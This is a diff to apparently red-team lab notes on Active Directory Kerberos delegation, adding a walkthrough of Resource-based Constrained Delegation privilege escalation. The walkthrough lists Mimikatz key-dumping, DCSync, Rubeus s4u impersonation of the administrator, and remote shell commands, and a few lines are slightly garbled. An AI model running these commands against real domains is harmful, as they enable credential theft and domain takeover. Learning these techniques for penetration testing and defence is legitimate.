@@ -8,6 +8,7 @@
   - [Constrained Delegation](#constrained-delegation)
   - [Leveraging Constrained Delegation](#leveraging-constrained-delegation)
   - [Persistence using msDS-AllowedToDelegateTo](#persistence-using-msds-allowedtodelegateto)
+  - [Privilege Escalation - Resource-based Constrained Delegation](#privilege-escalation---resource-based-constrained-delegation)
 
 ----
 
@@ -194,8 +195,7 @@ Get-DomainComputer -TrustedToAuth
 - AD Module
 
 ```
-Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
-"$null"} -Properties msDS-AllowedToDelegateTo
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```
 
 <br/>
@@ -349,6 +349,63 @@ Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateu
 
 ```
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+```
+
+<br/>
+
+## Privilege Escalation - Resource-based Constrained Delegation
+
+Resource-based Constrained Delegation moves delegation authority to the resource/service administrator.
+
+Instead of SPNs on `msDs-AllowedToDelegatTo` on the front-end service like web service, access in this case is controlled by **security descriptor** of `msDSAllowedToActOnBehalfOfOtherIdentity` (visible as `PrincipalsAllowedToDelegateToAccount`) on the resource/service like SQL Server service.
+
+That is, the resource/service administrator can configure this delegation whereas for other types, `SeEnableDelegation` privileges are required which are, by default, available only to Domain Admins.
+
+<br/>
+
+To abuse RBCD in the most effective form, we just need two privileges.
+
+1. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - `ms-DS-MachineAccountQuota` is 10 for all domain users)
+2. Write permissions over the target service or object to configure `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+
+<br/>
+
+We already have access to a domain joined machine. Let's enumerate if we have Write permissions over any object.
+
+- PowerView
+
+```
+Find-InterestingDomainAcl | ?{$_.identityreferencename match 'mgmtadmin'}
+```
+
+<br/>
+
+Using the ActiveDirectory module, configure RBCD on `us-helpdesk` for student machines :
+
+```
+$comps = 'student64$'
+
+Set-ADComputer -Identity us-helpdesk PrincipalsAllowedToDelegateToAccount $comps
+```
+
+<br/>
+
+Now, let's get the privileges of `student64$` by extracting its AES keys:
+
+```
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+<br/>
+
+Use the AES key of studentx$ with Rubeus and access `us-helpdesk` as ANY user we want:
+
+```
+.\Rubeus.exe s4u /user:student64$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d 83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
+```
+
+```
+winrs -r:us-helpdesk cmd.exe
 ```
 
 <br/>
